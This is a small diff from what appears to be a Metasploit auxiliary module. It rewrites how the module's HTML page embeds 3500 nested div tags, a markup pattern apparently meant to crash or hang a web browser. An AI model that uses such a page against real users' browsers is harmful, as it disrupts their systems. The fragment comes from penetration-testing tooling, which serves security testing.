@@ -50,10 +50,7 @@ class MetasploitModule < Msf::Auxiliary
   </style>
  </head>
  <body>
-|
-    html += "<div>" * 3500
-    html += "</div>" * 3500
-    html += %|
+ #{'<div>' * 3500 + '</div>' * 3500}
  </body>
 </html>
 |
